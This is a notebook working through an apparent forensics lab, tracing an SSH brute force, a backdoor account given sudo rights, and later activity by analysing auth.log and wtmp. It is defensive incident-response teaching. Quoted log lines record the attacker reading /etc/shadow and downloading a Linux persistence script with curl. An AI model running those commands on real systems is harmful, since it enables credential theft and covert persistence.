In [ ]:
import os
from google.colab import files

# Create a clean directory for evidence
!mkdir -p /content/evidence
%cd /content/evidence

# Upload the log files (auth.log, wtmp, etc.)
print("Upload your log files (auth.log, wtmp, etc.) below:")
uploaded = files.upload()

# List files to confirm
!ls -lh

/content/evidence
Upload your log files (auth.log, wtmp, etc.) below:


Saving auth.log to auth.log
Saving utmp.py to utmp.py
Saving wtmp to wtmp
total 60K
-rw-r--r-- 1 root root  43K Dec 12 11:53 auth.log
-rw-r--r-- 1 root root 3.1K Dec 12 11:53 utmp.py
-rw-r--r-- 1 root root  11K Dec 12 11:53 wtmp


In [5]:
%%writefile README.md
# Sherlock Scenario
In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

Overwriting README.md


In [6]:
%%bash
# Task 1: Initial reconnaissance - examine log structure
# Approach: View first line to understand field layout for parsing
head -1 /content/evidence/auth.log

Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)


In [7]:
%%bash
# Task 1: Process enumeration - identify all active services
# Approach: Extract process names (field 5), strip PIDs/colons, count occurrences
# This reveals patterns - legitimate services vs anomalies
awk '{print $5}' /content/evidence/auth.log | sed 's/[\[\:].*//g' | sort | uniq -c | sort -n

      1 chfn
      1 passwd
      1 useradd
      2 systemd
      2 usermod
      3 groupadd
      6 sudo
      8 systemd-logind
    104 CRON
    257 sshd


In [8]:
%%bash
# Task 1: SSH connection analysis - extract all source IPs
# Approach: Filter sshd entries, exclude pam_unix noise, regex match IPs, frequency count
# High frequency from single IP = potential brute force
grep sshd /content/evidence/auth.log | grep -v pam_unix | grep -oP ' [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort | uniq -c

      1  203.101.190.9
    165  65.2.161.68


In [9]:
%%bash
# Task 1 & 2: Identify successful authentication from suspicious IP
# Approach: Filter for "Accepted password" events from 65.2.161.68
# This confirms brute force success and reveals compromised account
grep sshd /content/evidence/auth.log | grep -v pam_unix | grep 'Accepted password' | grep 65.2.161.68

Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2


In [10]:
%%bash
# Task 1 & 2: Alternative view with context lines
# Approach: Show 3 lines after successful login for session establishment details
grep sshd /content/evidence/auth.log | grep -v pam_unix | grep 65.2.161.68 | grep -A3 'Accepted password'

Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Received disconnect from 65.2.161.68 port 46698:11: Bye Bye [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Disconnected from invalid user server_adm 65.2.161.68 port 46698 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2380]: Received disconnect from 65.2.161.68 port 46710:11: Bye Bye [preauth]
--
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2


In [11]:
%%bash
# Task 3 & 4: Session tracking via systemd-logind
# Approach: systemd-logind logs track session creation with session IDs
# Cross-reference with wtmp for precise login times
grep systemd-logind /content/evidence/auth.log

Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.


In [12]:
%%bash
# Task 3: Retrieve login session history from wtmp
# Approach: Parse wtmp binary with 'last' command in UTC timezone
# wtmp tracks physical logins, distinct from auth events
TZ=UTC last -F -f /content/evidence/wtmp

cyberjun pts/1        65.2.161.68      Wed Mar  6 06:37:35 2024   gone - no logout
root     pts/1        65.2.161.68      Wed Mar  6 06:32:45 2024 - Wed Mar  6 06:37:24 2024  (00:04)
root     pts/0        203.101.190.9    Wed Mar  6 06:19:55 2024   gone - no logout
reboot   system boot  6.2.0-1018-aws   Wed Mar  6 06:17:15 2024   still running
root     pts/1        203.101.190.9    Sun Feb 11 10:54:27 2024 - Sun Feb 11 11:08:04 2024  (00:13)
root     pts/1        203.101.190.9    Sun Feb 11 10:41:11 2024 - Sun Feb 11 10:41:46 2024  (00:00)
root     pts/0        203.101.190.9    Sun Feb 11 10:33:49 2024 - Sun Feb 11 11:08:04 2024  (00:34)
root     pts/0        203.101.190.9    Thu Jan 25 11:15:40 2024 - Thu Jan 25 12:34:34 2024  (01:18)
ubuntu   pts/0        203.101.190.9    Thu Jan 25 11:13:58 2024 - Thu Jan 25 11:15:12 2024  (00:01)
reboot   system boot  6.2.0-1017-aws   Thu Jan 25 11:12:17 2024 - Sun Feb 11 11:09:18 2024 (16+23:57)

wtmp begins Thu Jan 25 11:12:17 2024


In [13]:
%%bash
# Task 5: Persistence detection - new user account creation
# Approach: Track useradd events for unauthorized account establishment
grep useradd /content/evidence/auth.log

Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1


In [14]:
%%bash
# Task 5: Privilege escalation detection - group modifications
# Approach: Track usermod events, particularly sudo group additions
grep usermod /content/evidence/auth.log

Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'


In [15]:
%%bash
# Task 7: Session lifecycle - find disconnection events
# Approach: Search for "Disconnected from" or "session closed" for root from attacker IP
# First session = initial compromise before backdoor creation
grep sshd /content/evidence/auth.log | grep -E "(Disconnected|session closed)" | grep "65.2.161.68" | grep root | head -5

Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Disconnected from user root 65.2.161.68 port 34782
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184


In [16]:
%%bash
# Task 8: Command execution audit - sudo invocations
# Approach: auth.log captures sudo commands with full context
# Look for cyberjunkie user executing privileged commands
grep "sudo:" /content/evidence/auth.log

Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
